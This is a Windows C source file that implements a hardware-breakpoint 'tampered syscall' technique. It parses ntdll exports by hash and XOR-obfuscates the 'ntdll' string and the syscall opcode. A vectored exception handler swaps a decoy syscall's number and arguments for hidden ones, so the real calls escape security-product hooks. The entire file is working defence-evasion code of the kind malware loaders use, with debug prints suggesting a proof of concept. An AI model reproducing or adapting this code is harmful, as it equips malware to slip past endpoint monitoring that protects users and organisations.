#include <Windows.h>
#include <stdio.h>


#include "Structs.h"

// ==========================================================================================================================

#define MAX_ENTRIES		600
#define SYSCALL_STUB_SIZE	0x20

typedef struct _SYSCALL_ENTRY {
	
	UINT32		u32Hash;
	ULONG_PTR	uAddress;

} SYSCALL_ENTRY, * PSYSCALL_ENTRY;

typedef struct _SYSCALL_ENTRY_LIST {
	
	DWORD		dwEntriesCount;
	SYSCALL_ENTRY	Entries[MAX_ENTRIES];

} SYSCALL_ENTRY_LIST, * PSYSCALL_ENTRY_LIST;

typedef struct _TAMPERED_SYSCALL_PARMS {

	ULONG_PTR	uParm1;
	ULONG_PTR	uParm2;
	ULONG_PTR	uParm3;
	ULONG_PTR	uParm4;
	DWORD		dwSyscallNumber;

}TAMPERED_SYSCALL_PARMS, * PTAMPERED_SYSCALL_PARMS;

// ==========================================================================================================================

unsigned long long		SetDr7Bits				(unsigned long long CurrentDr7Register, int StartingBitPosition, int NmbrOfBitsToModify, unsigned long long NewBitValue);
UINT32				CRC32BA					(IN LPCSTR String);
BOOL				FetchSSNFromSyscallEntries		(IN UINT32 uCRC32FunctionHash, OUT PDWORD pdwSyscallNumber);
BOOL				InstallHardwareBreakPntHook		(IN ULONG_PTR uTargetFuncAddress);
LONG				ExceptionHandlerCallbackRoutine		(IN PEXCEPTION_POINTERS pExceptionInfo);

// ==========================================================================================================================

#define XOR_KEY1 0x2A25350D
#define XOR_KEY2 0x2A27C51A
#define XOR_KEY3 0x2325

// ==========================================================================================================================

volatile DWORD			g_NTDLLSTR1			= 0x46414163;	// 'ldtn' ^ 0x2A25350D = 0x6C64746E ^ 0x2A25350D = 0x46414163
volatile DWORD			g_NTDLLSTR2			= 0x4643Eb76;	// 'ld.l' ^ 0x2A27C51A = 0x6C642E6C ^ 0x2A27C51A = 0x4643Eb76
volatile unsigned short		g_SYSCALL_OPCODE		= 0x262A;	// 0x050F ^ 0x2325 = 0x262A
SYSCALL_ENTRY_LIST		g_EntriesList			= { 0x00 };
TAMPERED_SYSCALL_PARMS		g_TmprdSyscallParms		= { 0x00 };
CRITICAL_SECTION		g_CriticalSection		= { 0x00 };
PVOID				g_VehHandler			= NULL;
fnNtQueryDirectoryFile		g_pNtQuerySecurityObject	= NULL;																				
BOOL				g_DecoySyscallHooked		= FALSE;

// ==========================================================================================================================

unsigned long long SetDr7Bits(unsigned long long CurrentDr7Register, int StartingBitPosition, int NmbrOfBitsToModify, unsigned long long NewBitValue) {
	unsigned long long mask = (1UL << NmbrOfBitsToModify) - 1UL;
	unsigned long long NewDr7Register = (CurrentDr7Register & ~(mask << StartingBitPosition)) | (NewBitValue << StartingBitPosition);
	return NewDr7Register;
}

// ==========================================================================================================================

UINT32 CRC32BA(IN LPCSTR String) {

	UINT32      	uMask		= 0x00,
			uHash		= 0xFFFFEFFF;
	INT         	i		= 0x00;

	while (String[i] != 0) {

		uHash = uHash ^ (UINT32)String[i];

		for (int ii = 0; ii < 8; ii++) {

			uMask = -1 * (uHash & 1);
			uHash = (uHash >> 1) ^ (0xEDB88320 & uMask);
		}

		i++;
	}

	return ~uHash;
}

// ==========================================================================================================================

// Sorting By System Call Address	- https://github.com/jthuraisamy/SysWhispers2/blob/main/example-output/Syscalls.c#L32
// Fetching SSN				- https://github.com/jthuraisamy/SysWhispers2/blob/main/example-output/Syscalls.c#L128

BOOL FetchSSNFromSyscallEntries(IN UINT32 uCRC32FunctionHash, OUT PDWORD pdwSyscallNumber) {

	if (!uCRC32FunctionHash || !pdwSyscallNumber)
		return FALSE;
	
_SEARCH_POPULATED_LIST:
	// If populated, search ...
	if (g_EntriesList.dwEntriesCount) {

		for (DWORD i = 0x00; i < g_EntriesList.dwEntriesCount; i++) {
			if (uCRC32FunctionHash == g_EntriesList.Entries[i].u32Hash) {
				*pdwSyscallNumber =  i;
				return TRUE;
			}
		}
		
		return FALSE;
	}

#if defined(_WIN64)
	PPEB				pPeb				= (PPEB)__readgsqword(0x60);
#else
	return FALSE;
#endif

	PLDR_DATA_TABLE_ENTRY		pDataTableEntry			= (PLDR_DATA_TABLE_ENTRY)pPeb->LoaderData->InMemoryOrderModuleList.Flink;
	PIMAGE_NT_HEADERS		pImgNtHdrs			= NULL;
	PIMAGE_EXPORT_DIRECTORY		pExportDirectory		= NULL;
	ULONG_PTR			uNtdllBase			= NULL;
	PDWORD				pdwFunctionNameArray		= NULL;
	PDWORD				pdwFunctionAddressArray		= NULL;
	PWORD				pwFunctionOrdinalArray		= NULL;

	// Skip local image
	pDataTableEntry = *(PLDR_DATA_TABLE_ENTRY*)pDataTableEntry;

	// Fetch ntdll.dll's base address
	uNtdllBase = (ULONG_PTR)pDataTableEntry->InInitializationOrderLinks.Flink;

	pImgNtHdrs = (PIMAGE_NT_HEADERS)(uNtdllBase + ((PIMAGE_DOS_HEADER)uNtdllBase)->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return FALSE;

	pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(uNtdllBase + pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	if (((*(ULONG*)(uNtdllBase + pExportDirectory->Name)) | 0x20202020) != (g_NTDLLSTR1 ^ XOR_KEY1))
		return FALSE;

	if (((*(ULONG*)(uNtdllBase + pExportDirectory->Name + 0x04)) | 0x20202020) != (g_NTDLLSTR2 ^ XOR_KEY2))
		return FALSE;

	pdwFunctionNameArray		= (PDWORD)(uNtdllBase + pExportDirectory->AddressOfNames);
	pdwFunctionAddressArray		= (PDWORD)(uNtdllBase + pExportDirectory->AddressOfFunctions);
	pwFunctionOrdinalArray		= (PWORD)(uNtdllBase + pExportDirectory->AddressOfNameOrdinals);

	// Store Zw* syscalls addresses
	for (int i = 0; i < pExportDirectory->NumberOfNames; i++) {

		CHAR* pFunctionName = (CHAR*)(uNtdllBase + pdwFunctionNameArray[i]);

		if (*(unsigned short*)pFunctionName == 'wZ' && g_EntriesList.dwEntriesCount <= MAX_ENTRIES) {
			g_EntriesList.Entries[g_EntriesList.dwEntriesCount].u32Hash	= CRC32BA(pFunctionName);
			g_EntriesList.Entries[g_EntriesList.dwEntriesCount].uAddress	= (ULONG_PTR)(uNtdllBase + pdwFunctionAddressArray[pwFunctionOrdinalArray[i]]);
			g_EntriesList.dwEntriesCount++;
		}
	}

	// Sort Zw* syscalls addresses in ascending order
	for (int i = 0; i < g_EntriesList.dwEntriesCount - 0x01; i++) {

		for (int j = 0; j < g_EntriesList.dwEntriesCount - i - 0x01; j++) {

			if (g_EntriesList.Entries[j].uAddress > g_EntriesList.Entries[j + 1].uAddress) {

				SYSCALL_ENTRY TempEntry = { .u32Hash = g_EntriesList.Entries[j].u32Hash, .uAddress = g_EntriesList.Entries[j].uAddress };

				g_EntriesList.Entries[j].u32Hash	= g_EntriesList.Entries[j + 1].u32Hash;
				g_EntriesList.Entries[j].uAddress	= g_EntriesList.Entries[j + 1].uAddress;

				g_EntriesList.Entries[j + 1].u32Hash	= TempEntry.u32Hash;
				g_EntriesList.Entries[j + 1].uAddress	= TempEntry.uAddress;

			}
		}
	}

	goto _SEARCH_POPULATED_LIST;
}

// ==========================================================================================================================

BOOL StoreTamperedSyscallParms(IN UINT32 uSyscallFunctionHash, IN ULONG_PTR uParm1, IN ULONG_PTR uParm2, IN ULONG_PTR uParm3, IN ULONG_PTR uParm4) {
	
	DWORD	dwSyscallNumber			= 0x00;
	PVOID	pDecoySyscallInstructionAddr	= NULL;

	if (!g_pNtQuerySecurityObject) {
		
		if (!(g_pNtQuerySecurityObject = (fnNtQueryDirectoryFile)GetProcAddress(GetModuleHandle(TEXT("NTDLL.DLL")), "NtQuerySecurityObject"))) {
			printf("[!] GetProcAddress [%ws.%d] Failed With Error: %d \n", GET_FILENAMEW(__FILEW__), __LINE__, GetLastError());
			return FALSE;
		}
	}

	for (int i = 0; i < SYSCALL_STUB_SIZE; i++) {

		if (*(unsigned short*)((ULONG_PTR)g_pNtQuerySecurityObject + i) == (g_SYSCALL_OPCODE ^ XOR_KEY3)) {
			pDecoySyscallInstructionAddr = (PVOID)((ULONG_PTR)g_pNtQuerySecurityObject + i);
			break;
		}
	}

	if (!pDecoySyscallInstructionAddr)
		return FALSE;

	if (!FetchSSNFromSyscallEntries(uSyscallFunctionHash, &dwSyscallNumber) || !dwSyscallNumber)
		return FALSE;

	EnterCriticalSection(&g_CriticalSection);

	g_TmprdSyscallParms.uParm1			= uParm1;
	g_TmprdSyscallParms.uParm2			= uParm2;
	g_TmprdSyscallParms.uParm3			= uParm3;
	g_TmprdSyscallParms.uParm4			= uParm4;
	g_TmprdSyscallParms.dwSyscallNumber		= dwSyscallNumber;

	LeaveCriticalSection(&g_CriticalSection);

	if (!g_DecoySyscallHooked) {
		
		if (!InstallHardwareBreakPntHook(pDecoySyscallInstructionAddr))
			return FALSE;
		else
			g_DecoySyscallHooked = TRUE;
	}

	return TRUE;
}

// ==========================================================================================================================

BOOL InitHardwareBreakpointHooking() {

	if (g_VehHandler)
		return TRUE;

	InitializeCriticalSection(&g_CriticalSection);

	if (!(g_VehHandler = AddVectoredExceptionHandler(0x01, (PVECTORED_EXCEPTION_HANDLER)ExceptionHandlerCallbackRoutine))) {
		printf("[!] AddVectoredExceptionHandler [%ws.%d] Failed With Error: %d \n", GET_FILENAMEW(__FILEW__), __LINE__, GetLastError());
		return FALSE;
	}

	return TRUE;
}


BOOL HaltHardwareBreakpointHooking() {

	if (g_VehHandler) {

		DeleteCriticalSection(&g_CriticalSection);

		if (RemoveVectoredExceptionHandler(g_VehHandler) == 0x00) {
			printf("[!] RemoveVectoredExceptionHandler [%ws.%d] Failed With Error: %d \n", GET_FILENAMEW(__FILEW__), __LINE__, GetLastError());
			return FALSE;
		}

		return TRUE;
	}

	return FALSE;
}

// ==========================================================================================================================

BOOL InstallHardwareBreakPntHook(IN ULONG_PTR uTargetFuncAddress) {

	CONTEXT		ThreadContext		= { 0x00 };

	RtlSecureZeroMemory(&ThreadContext, sizeof(CONTEXT));
	ThreadContext.ContextFlags = CONTEXT_DEBUG_REGISTERS;

	if (!uTargetFuncAddress)
		return FALSE;

	if (!GetThreadContext(NtCurrentThread(), &ThreadContext)) {
		printf("[!] GetThreadContext [%ws.%d] Failed With Error: %d \n", GET_FILENAMEW(__FILEW__), __LINE__, GetLastError());
		return FALSE;
	}

	// *OPTIONAL* 
	// Register is already in use
	if (ThreadContext.Dr0)
		return FALSE;

	// Using the Dr0 register
	ThreadContext.Dr0 = uTargetFuncAddress;
	ThreadContext.Dr7 = SetDr7Bits(ThreadContext.Dr7, 0x00, 0x01, 0x01);

	if (!SetThreadContext(NtCurrentThread(), &ThreadContext)) {
		printf("[!] SetThreadContext [%ws.%d] Failed With Error: %d \n", GET_FILENAMEW(__FILEW__), __LINE__, GetLastError());
		return FALSE;
	}

	return TRUE;
}

// ==========================================================================================================================

LONG ExceptionHandlerCallbackRoutine(IN PEXCEPTION_POINTERS pExceptionInfo) {

	BOOL bResolved = FALSE;

	if (pExceptionInfo->ExceptionRecord->ExceptionCode != STATUS_SINGLE_STEP)
		goto _EXIT_ROUTINE;

	if (pExceptionInfo->ExceptionRecord->ExceptionAddress != pExceptionInfo->ContextRecord->Dr0)
		goto _EXIT_ROUTINE;

	EnterCriticalSection(&g_CriticalSection);

	printf("\t[>] Replacing Decoy Syscall [%d] With [%d] \n", pExceptionInfo->ContextRecord->Rax, g_TmprdSyscallParms.dwSyscallNumber);

	// Replace Decoy SSN
	pExceptionInfo->ContextRecord->Rax		= (DWORD64)g_TmprdSyscallParms.dwSyscallNumber;

	// Replace Decoy parms
	pExceptionInfo->ContextRecord->R10		= (DWORD64)g_TmprdSyscallParms.uParm1;
	pExceptionInfo->ContextRecord->Rdx		= (DWORD64)g_TmprdSyscallParms.uParm2;
	pExceptionInfo->ContextRecord->R8		= (DWORD64)g_TmprdSyscallParms.uParm3;
	pExceptionInfo->ContextRecord->R9		= (DWORD64)g_TmprdSyscallParms.uParm4;

	printf("\t[>] Patched Registers With The Legit Values \n");

	// Continue
	pExceptionInfo->ContextRecord->EFlags		= pExceptionInfo->ContextRecord->EFlags | (1 << 16);

	LeaveCriticalSection(&g_CriticalSection);

	bResolved = TRUE;

_EXIT_ROUTINE:
	return (bResolved ? EXCEPTION_CONTINUE_EXECUTION : EXCEPTION_CONTINUE_SEARCH);
}

